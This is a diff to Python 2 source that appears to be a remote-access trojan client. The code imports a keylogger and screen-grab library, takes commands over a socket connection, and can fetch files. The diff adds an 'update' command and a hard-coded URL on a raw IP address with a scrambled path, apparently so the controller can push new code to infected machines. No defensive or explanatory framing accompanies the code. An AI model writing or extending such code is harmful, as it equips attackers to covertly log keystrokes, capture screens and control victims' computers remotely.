@@ -1,6 +1,6 @@
 import subprocess, socket, platform, os, datetime
 import PIL.ImageGrab
-import keyLogger, update
+import keyLogger, update, updt
 from threading import Thread
 from urllib2 import urlopen
 
@@ -11,11 +11,14 @@ class functions(object):
 
     logger = keyLogger.keyLogger()
     updater = update.Update()
+    updt = updt.Updt()
 
     threadLogger = None
     threadMain = None
 
     running = False
+
+    versionUrl = 'http://85.255.5.44/vxsrfp/xkv{nqt.html'
 
     def __init__(self,host,port):
         self.host = host
@@ -41,6 +44,11 @@ class functions(object):
                 elif data == "version\n":
                     version = self.updater.getVersion()
                     soc.send(version + "\n")
+
+                elif data == "update\n":
+                    message = self.updt.update()
+                    message = message+'\n'
+                    soc.send(message)
 
                 elif data.startswith("getFile("):
                     url = data[8:-2]
